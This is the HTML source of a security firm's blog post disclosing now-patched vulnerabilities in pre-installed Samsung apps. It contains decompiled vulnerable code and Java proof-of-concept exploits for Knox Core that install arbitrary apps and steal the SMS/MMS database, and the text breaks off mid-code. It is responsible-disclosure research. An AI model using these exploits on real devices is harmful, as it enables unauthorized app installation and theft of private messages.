<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <link rel="apple-touch-icon" sizes="180x180" href="https://blog.oversecured.com/assets/images/apple-touch-icon.png}">
    <link rel="icon" type="image/png" sizes="32x32" href="https://blog.oversecured.com/assets/images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://blog.oversecured.com/assets/images/favicon-16x16.png">
    <link rel="manifest" href="https://blog.oversecured.com/assets/images/site.webmanifes">
    <link rel="mask-icon" href="https://blog.oversecured.com/assets/images/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>Two weeks of securing Samsung devices&#58; Part 1 | Oversecured Blog</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="https://blog.oversecured.com/assets/images/favicon.svg" type="image/png" />
    <meta property="og:site_name" content="News, Techniques & Guides" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Two weeks of securing Samsung devices&#58; Part 1" />
    <meta property="og:description" content="After spending two weeks looking for security bugs in the pre-installed apps on Samsung devices, we were able to find multiple dangerous vulnerabilities." />
    <meta property="og:url" content="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/" />
    <meta property="og:image" content="https://blog.oversecured.com/assets/images/twelfth-article.png?56790864у5689" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Two weeks of securing Samsung devices&#58; Part 1" />
    <meta name="twitter:description" content="After spending two weeks looking for security bugs in the pre-installed apps on Samsung devices, we were able to find multiple dangerous vulnerabilities." />
    <meta name="twitter:url" content="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/" />
    <meta name="twitter:image:src" content="https://blog.oversecured.com/assets/images/twelfth-article.png?56790864у5689" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="News, Techniques & Guides" />
    <meta name="twitter:site" content="@OversecuredInc" />
    <meta name="twitter:creator" content="@OversecuredInc" />
    <meta property="og:image:width" content="2000" />
    <meta property="og:image:height" content="666" />
    <meta data-rh="true" name="robots" content="index,follow,max-image-preview:large">

    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>
        .hljs { background: none; }

        .markdown-in-single-quotes {
            word-break: break-word;
        }

        .heading-anchor > a {
            font-family: -apple-system, system-ui, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;;
            font-size: 40px !important;
            font-weight: 700;
            color: #000 !important;
        }

        .heading-anchor-small > a {
            font-size: 28px !important;
        }

        .heading-anchor:hover {
            text-decoration: underline;
            cursor: pointer;
        }

        .heading-anchor > a:hover {
            color: black !important;
        }

        .anchorjs-link:hover::after {
            color: black;
        }

        .heading-anchor:target {
            scroll-margin-top: 80px;
        }

        .post-full-content a {
            box-shadow: none;
        }

        .gdpr-notice {
            display: flex;
            align-items: center;
            position: fixed;
            z-index: 1000;
            bottom: 20px;
            right: 20px;
            background: #242424;
            border-radius: 15px;
            padding: 15px 20px;
        }

        .gdpr-notice__text {
            margin: 0;
            max-width: 400px;
            color: white;
            font-style: normal;
            font-weight: normal;
            font-size: 14px;
        }

        .gdpr-notice__btn-accept {
            background: #FFB400;
            border: 2px solid #FFB400;
            box-sizing: border-box;
            border-radius: 8px;
            font-style: normal;
            font-weight: bold;
            font-size: 14px;
            line-height: 17px;
            color: #FFFFFF;
            padding: 10px 40px;
            outline: none;
            transition: 0.3s;
        }

        .gdpr-notice__btn-accept:hover {
            opacity: 0.7;
        }

        .gdpr-notice__btn-accept:active {
            opacity: 1;
        }

        .gdpr-notice__link {
            color: white;
            text-decoration: underline;
        }

        .post-full-content > div > ul > li > a {
            color: #30c4fc;
        }

        .post-full-content > div > ul > li > a:hover {
            color: #3289b3;
        }

        .post-full-content > div > p > a {
            color: #30c4fc;
        }

        .post-full-content > div > p > a:hover {
            color: #3289b3;
        }

        .table {
            white-space: normal !important;
        }

        @media (max-width: 620px) {
            .gdpr-notice {
                display: flex;
                align-items: center;
                flex-direction: column;
                position: fixed;
                z-index: 1000;
                bottom: 0;
                right: 0;
                background: #242424;
                border-radius: 0;
                padding: 15px 20px;
                width: 100%;
            }

            .gdpr-notice__text {
                margin-bottom: 15px;
            }

            .heading-anchor > a {
                font-size: 25px !important;
                padding-left: 20px !important;
                display: block;
            }

            .anchor-item {
                padding: 0 !important;
                margin-left: -20px !important;
            }
        }

    </style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->

    <!-- This tag outputs SEO meta+structured data and other important settings -->
<!--    <meta name="description" content="After spending two weeks looking for security bugs in the pre-installed apps on Samsung devices, we were able to find multiple dangerous vulnerabilities." />
    <link rel="canonical" href="/Two-weeks-of-securing-Samsung-devices-Part-1/" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

    

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "News, Techniques & Guides",
        "logo": "/assets/images/blog-icon.png"
    },
    "url": "Jekyll::Drops::SiteDrop/Two-weeks-of-securing-Samsung-devices-Part-1/",
    "image": {
        "@type": "ImageObject",
        "url": "/assets/images/twelfth-article.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "/Two-weeks-of-securing-Samsung-devices-Part-1/"
    },
    "description": "After spending two weeks looking for security bugs in the pre-installed apps on Samsung devices, we were able to find multiple dangerous vulnerabilities. In this blog, we will be going over them. The impact of these bugs could have allowed an attacker to access and edit the victim’s contacts, calls,"
}
    </script>

    <link rel="alternate" type="application/rss+xml" title="Two weeks of securing Samsung devices&#58; Part 1" href="/feed.xml" />
-->

</head>
<body class="post-template">
<!--    <a id="notice" style="font-size: 16px; font-weight: 700" class="link-to-oversecured" target="_blank" href="https://oversecured.com/" rel="noopener">Visit Oversecured.com and get 3 free scans</a>-->
    <svg id="cross" class="link-to-oversecured__cross" width="11" height="11" viewBox="0 0 11 11" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.70711 9.70735C9.31658 10.0979 8.68342 10.0979 8.29289 9.70735L0.707107 2.12156C0.316582 1.73104 0.316582 1.09788 0.707107 0.707351C1.09763 0.316827 1.7308 0.316826 2.12132 0.70735L9.70711 8.29314C10.0976 8.68366 10.0976 9.31683 9.70711 9.70735Z" fill="white"/>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.70711 0.7072C10.0976 1.09772 10.0976 1.73089 9.70711 2.12141L2.12132 9.7072C1.7308 10.0977 1.09763 10.0977 0.707107 9.7072C0.316582 9.31668 0.316582 8.68351 0.707106 8.29299L8.29289 0.7072C8.68342 0.316676 9.31658 0.316676 9.70711 0.7072Z" fill="white"/>
    </svg>
    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

assign cover = page.cover


<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->
<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="/"><img src="/assets/images/blog-icon.png" alt="News, Techniques & Guides" /></a>
            
        
        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
<!--            -->
<!--                <a class="social-link social-link-tw" href="https://twitter.com/OversecuredInc" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>-->
<!--            -->
<!--        </div>-->
<!--        -->
<!--    </div>-->
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full post tag-getting-started ">
            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime="10 June 2021">10 June 2021</time>
                    
                </section>
                <h1 class="post-full-title">Two weeks of securing Samsung devices&#58; Part 1</h1>
            </header>

            
            <div class="post-full-image" style="background-image: url(/assets/images/twelfth-article.png)">
            </div>
            

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p>After spending two weeks looking for security bugs in the pre-installed apps on Samsung devices, we were able to find multiple dangerous vulnerabilities. In this blog, we will be going over them.</p>

<p>The impact of these bugs could have allowed an attacker to access and edit the victim’s contacts, calls, SMS/MMS, install arbitrary apps with device administrator rights, or read and write arbitrary files on behalf of a system user which could change the device’s settings.</p>

<p>These vulnerabilities could have led to a GDPR violation, and we are delighted that we could help Samsung identify and fix these vulnerabilities in a timely manner.</p>

<p>If you’re a developer or an app owner, you can integrate Oversecured into your CI/CD to proactively secure your apps against these vulnerabilities. The CI/CD process can also be fully automated using plugins. Our solutions will continuously monitor your apps and alert you if any new vulnerabilities are detected.</p>

<p>Start securing your apps by beginning a trial from <a href="https://oversecured.com/docs/quick-start/">Quick Start</a>, or you can contact us <a href="https://oversecured.com/contact-us">here</a> to learn more and get a demo.</p>

<p>If you’re a security researcher, you can automate the process of bug detection by using Oversecured’s mobile app scanner to scan for these bugs. All you have to do is <a href="https://oversecured.com/sign-up">sign up</a> and upload your app’s files. Our scanner will take care of the rest.</p>

<p>Vulnerability table:</p>

<table class="table">
  <thead>
    <tr>
      <th><strong>CVE</strong></th>
      <th><strong>SVE</strong></th>
      <th><strong>Affected app</strong></th>
      <th><strong>Description</strong></th>
      <th><strong>Reward amount</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CVE-2021-25388</td>
      <td>SVE-2021-20636</td>
      <td>Knox Core (com.samsung.android.knox.containercore)</td>
      <td>Installation of arbitrary apps and device-wide theft of arbitrary files</td>
      <td>$1720</td>
    </tr>
    <tr>
      <td>CVE-2021-25356</td>
      <td>SVE-2021-20733</td>
      <td>Managed Provisioning (com.android.managedprovisioning)</td>
      <td>Installing third-party apps and granting them Device Admin permissions</td>
      <td>$7000</td>
    </tr>
    <tr>
      <td>CVE-2021-25391</td>
      <td>SVE-2021-20500</td>
      <td>Secure Folder (com.samsung.knox.securefolder)</td>
      <td>Gaining access to arbitrary* content providers</td>
      <td>$1050</td>
    </tr>
    <tr>
      <td>CVE-2021-25393</td>
      <td>SVE-2021-20731</td>
      <td>SecSettings (com.android.settings)</td>
      <td>Gaining access to arbitrary* content providers leads to read/write access to arbitrary files as system user (UID 1000)</td>
      <td>$5460</td>
    </tr>
    <tr>
      <td>CVE-2021-25392</td>
      <td>SVE-2021-20690</td>
      <td>Samsung DeX System UI (com.samsung.desktopsystemui)</td>
      <td>Ability to steal notification policy configuration</td>
      <td>$330</td>
    </tr>
    <tr>
      <td>CVE-2021-25397</td>
      <td>SVE-2021-20716</td>
      <td>TelephonyUI (com.samsung.android.app.telephonyui)</td>
      <td>(Over-)writing arbitrary files as UID 1001</td>
      <td>$4850</td>
    </tr>
    <tr>
      <td>CVE-2021-25390</td>
      <td>SVE-2021-20724</td>
      <td>PhotoTable (com.android.dreams.phototable)</td>
      <td>Intent redirection leads to gaining access to arbitrary content providers</td>
      <td>$280</td>
    </tr>
  </tbody>
</table>

<p class="heading-anchor"><a href="#the-vulnerability-in-knox-core">The vulnerability in Knox Core</a></p>
<p>First, we scanned the Knox Core app and discovered that an app was installed from the SD card:
<img class="post-template__vulnearbility-image" src="/assets/images/knox.png" alt="vulnerability" /></p>

<p class="markdown-in-single-quotes">It also turned out that this functionality is activated via the exported service <code class="highlighter-rouge">com.samsung.android.knox.containercore.provisioning.DualDARInitService</code>:</p>
<div class="language-xml code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;service</span> <span class="na">android:name=</span><span class="s">"com.samsung.android.knox.containercore.provisioning.DualDARInitService"</span> <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;intent-filter&gt;</span>
       <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"com.samsung.android.knox.containercore.provisioning.DualDARInitService"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/service&gt;</span>
</code></pre></div></div>
<p class="markdown-in-single-quotes">An attacker could pass an arbitrary URI via the <code class="highlighter-rouge">dualdar-config-client-location</code> parameter, which will be copied to <code class="highlighter-rouge">/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk</code>, which is a world-readable location.</p>
<p>After that, the app installation process will be launched:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">proceedPrerequisiteForDualDARWithWPCOD</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
   <span class="k">if</span> <span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getBooleanExtra</span><span class="o">(</span><span class="s">"DUAL_DAR_IS_WPCOD"</span><span class="o">,</span> <span class="kc">false</span><span class="o">))</span> <span class="o">{</span>
       <span class="kt">int</span> <span class="n">intExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getIntExtra</span><span class="o">(</span><span class="s">"android.intent.extra.user_handle"</span><span class="o">,</span> <span class="n">UserHandle</span><span class="o">.</span><span class="na">myUserId</span><span class="o">());</span>
       <span class="n">Bundle</span> <span class="n">bundleExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getBundleExtra</span><span class="o">(</span><span class="s">"DUAL_DAR_PARAMS"</span><span class="o">);</span>
       <span class="n">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">bundleExtra</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"dualdar-config-client-package"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
       <span class="k">if</span> <span class="o">(!</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">string</span><span class="o">))</span> <span class="o">{</span>
           <span class="n">DDLog</span><span class="o">.</span><span class="na">m4d</span><span class="o">(</span><span class="s">"KNOXCORE::DualDARInitService"</span><span class="o">,</span> <span class="s">"Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto"</span><span class="o">);</span>
           <span class="n">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="n">bundleExtra</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"dualdar-config-client-location"</span><span class="o">);</span> <span class="c1">// attacker-controlled URI</span>
           <span class="n">DDLog</span><span class="o">.</span><span class="na">m4d</span><span class="o">(</span><span class="s">"KNOXCORE::DualDARInitService"</span><span class="o">,</span> <span class="s">"DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = "</span> <span class="o">+</span> <span class="n">string2</span><span class="o">);</span>
           <span class="k">if</span> <span class="o">(</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">string2</span><span class="o">))</span> <span class="o">{</span>
               <span class="n">notifyMPError</span><span class="o">(</span><span class="mi">5</span><span class="o">);</span>
           <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">string2</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"file://"</span><span class="o">))</span> <span class="o">{</span>
               <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">getExternalFilesDir</span><span class="o">(</span><span class="kc">null</span><span class="o">)</span> <span class="o">+</span> <span class="s">"/client_downloaded_knox_app.apk"</span><span class="o">;</span>
               <span class="k">try</span> <span class="o">{</span>
                   <span class="c1">// attacker-controlled file is copied to the public location</span>
                   <span class="o">((</span><span class="n">SemRemoteContentManager</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">mContext</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="s">"rcp"</span><span class="o">)).</span><span class="na">copyFile</span><span class="o">(</span><span class="n">intExtra</span><span class="o">,</span> <span class="n">string2</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">"^file://"</span><span class="o">,</span> <span class="s">""</span><span class="o">),</span> <span class="n">intExtra</span><span class="o">,</span> <span class="n">str</span><span class="o">);</span>
                   <span class="n">installPackageTask</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">string</span><span class="o">,</span> <span class="n">str</span><span class="o">);</span> <span class="c1">// and then installed</span>
               <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RemoteException</span> <span class="n">unused</span><span class="o">)</span> <span class="o">{</span>
                   <span class="n">DDLog</span><span class="o">.</span><span class="na">m3e</span><span class="o">(</span><span class="s">"KNOXCORE::DualDARInitService"</span><span class="o">,</span> <span class="s">"copyFile failed."</span><span class="o">);</span>
                   <span class="n">notifyMPError</span><span class="o">(</span><span class="mi">5</span><span class="o">);</span>
               <span class="o">}</span>
           <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">string2</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"https://"</span><span class="o">))</span> <span class="o">{</span>
               <span class="n">downloadPackageTask</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">string</span><span class="o">,</span> <span class="n">string2</span><span class="o">);</span>
           <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
               <span class="n">notifyMPError</span><span class="o">(</span><span class="mi">5</span><span class="o">);</span>
           <span class="o">}</span>
       <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
           <span class="n">DDLog</span><span class="o">.</span><span class="na">m4d</span><span class="o">(</span><span class="s">"KNOXCORE::DualDARInitService"</span><span class="o">,</span> <span class="s">"Start proceedPrerequisiteForDualDARWithWPCOD native crypto"</span><span class="o">);</span>
           <span class="n">startRunnerTask</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
       <span class="o">}</span>
   <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p class="heading-anchor"><a href="#proof-of-concept-for-installing-arbitrary-apps">Proof of Concept for installing arbitrary apps</a></p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
   <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

   <span class="k">try</span> <span class="o">{</span>
       <span class="n">Bundle</span> <span class="n">bundle</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Bundle</span><span class="o">();</span>
       <span class="n">bundle</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"dualdar-config-client-package"</span><span class="o">,</span> <span class="s">"test.exampleapp"</span><span class="o">);</span>
       <span class="n">bundle</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"dualdar-config-client-location"</span><span class="o">,</span> <span class="n">Uri</span><span class="o">.</span><span class="na">fromFile</span><span class="o">(</span><span class="n">copyFile</span><span class="o">()).</span><span class="na">toString</span><span class="o">());</span>

       <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"com.samsung.android.knox.containercore.provisioning.DualDARInitService"</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.android.knox.containercore"</span><span class="o">,</span> <span class="s">"com.samsung.android.knox.containercore.provisioning.DualDARInitService"</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"DualDARServiceEventFlag"</span><span class="o">,</span> <span class="mi">500</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"DUAL_DAR_IS_WPCOD"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"DUAL_DAR_PARAMS"</span><span class="o">,</span> <span class="n">bundle</span><span class="o">);</span>
       <span class="n">startService</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
   <span class="o">}</span>
   <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
       <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
   <span class="o">}</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="n">File</span> <span class="nf">copyFile</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
   <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">getApplicationInfo</span><span class="o">().</span><span class="na">dataDir</span><span class="o">,</span> <span class="s">"app.apk"</span><span class="o">);</span>

   <span class="n">InputStream</span> <span class="n">i</span> <span class="o">=</span> <span class="n">getAssets</span><span class="o">().</span><span class="na">open</span><span class="o">(</span><span class="s">"app-release.apk"</span><span class="o">);</span>
   <span class="n">OutputStream</span> <span class="n">o</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
   <span class="n">IOUtils</span><span class="o">.</span><span class="na">copy</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="n">o</span><span class="o">);</span>
   <span class="n">i</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
   <span class="n">o</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
   <span class="k">return</span> <span class="n">file</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>
<p class="heading-anchor"><a href="#proof-of-concept-of-sms-mms-file-theft">Proof of Concept of SMS/MMS file theft</a></p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
   <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

   <span class="n">startDump</span><span class="o">();</span>

   <span class="k">try</span> <span class="o">{</span>
       <span class="n">File</span> <span class="n">dbPath</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">getPackageManager</span><span class="o">().</span><span class="na">getApplicationInfo</span><span class="o">(</span><span class="s">"com.android.providers.telephony"</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">dataDir</span><span class="o">,</span> <span class="s">"databases/mmssms.db"</span><span class="o">);</span>

       <span class="n">Bundle</span> <span class="n">bundle</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Bundle</span><span class="o">();</span>
       <span class="n">bundle</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"dualdar-config-client-package"</span><span class="o">,</span> <span class="s">"test.exampleapp"</span><span class="o">);</span>
       <span class="n">bundle</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"dualdar-config-client-location"</span><span class="o">,</span> <span class="n">Uri</span><span class="o">.</span><span class="na">fromFile</span><span class="o">(</span><span class="n">dbPath</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>

       <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"com.samsung.android.knox.containercore.provisioning.DualDARInitService"</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.android.knox.containercore"</span><span class="o">,</span> <span class="s">"com.samsung.android.knox.containercore.provisioning.DualDARInitService"</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"DualDARServiceEventFlag"</span><span class="o">,</span> <span class="mi">500</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"DUAL_DAR_IS_WPCOD"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"DUAL_DAR_PARAMS"</span><span class="o">,</span> <span class="n">bundle</span><span class="o">);</span>
       <span class="k">new</span> <span class="nf">Thread</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
           <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="o">;</span> <span class="n">j</span><span class="o">++)</span> <span class="o">{</span>
               <span class="n">startService</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
               <span class="k">try</span> <span class="o">{</span>
                   <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">500</span><span class="o">);</span>
               <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
                   <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
               <span class="o">}</span>
           <span class="o">}</span>
       <span class="o">}).</span><span class="na">start</span><span class="o">();</span>
   <span class="o">}</span>
   <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
       <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
   <span class="o">}</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="kt">void</span> <span class="nf">startDump</span><span class="o">()</span> <span class="o">{</span>
   <span class="kd">final</span> <span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk"</span><span class="o">;</span>

   <span class="n">ContentValues</span> <span class="n">values</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ContentValues</span><span class="o">();</span>
   <span class="n">values</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"_data"</span><span class="o">,</span> <span class="n">path</span><span class="o">);</span>
   <span class="n">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">insert</span><span class="o">(</span><span class="n">MediaStore</span><span class="o">.</span><span class="na">Files</span><span class="o">.</span><span class="na">getContentUri</span><span class="o">(</span><span class="s">"external"</span><span class="o">),</span> <span class="n">values</span><span class="o">);</span>

   <span class="k">new</span> <span class="nf">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span>
       <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
           <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
               <span class="k">try</span> <span class="o">{</span>
                   <span class="n">InputStream</span> <span class="n">i</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
                   <span class="n">String</span> <span class="n">data</span> <span class="o">=</span> <span class="n">IOUtils</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
                   <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
                   <span class="n">i</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
               <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
